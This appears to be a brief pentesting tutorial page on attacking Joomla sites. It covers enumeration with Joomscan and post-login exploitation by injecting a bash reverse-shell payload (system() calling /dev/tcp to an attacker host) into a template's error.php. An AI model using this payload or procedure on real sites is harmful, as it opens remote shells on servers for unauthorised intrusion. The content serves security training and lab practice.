# Joomla.
Joomla is a free and open-source content management system (CMS) for publishing web content. It's programmed in PHP and SQL.

## Joomla enumeration.
### Joomscan.
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/f4d3e4f8-176c-49ca-8b6d-82e48f00aae5" width="500">

## Joomla exploitation.
Once we have acces to the Joomla control Panel we can access to `Extensions > Templates > Templates`.
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/70d9919e-fc73-414b-b62a-971bc97b1e73" width="900"><br />
There, we can open up a template and inject a reverse shell code in `error.php`:<br />
```php
system("bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'");
```

<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/0d208a1f-caeb-4b78-955a-1b51b0ccef99" width="900"><br />

<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/2ca28271-ac81-435e-af66-11bee7471ed2" width="600"><br />

<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/5e001505-2a32-4a06-8f32-fc7dd0d1e36e" width="900"><br />

Finally we just have to produce the error while we are listening for a connection.<br />
![5](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/b06e220b-d14f-458a-97c2-91b2fccd351e)
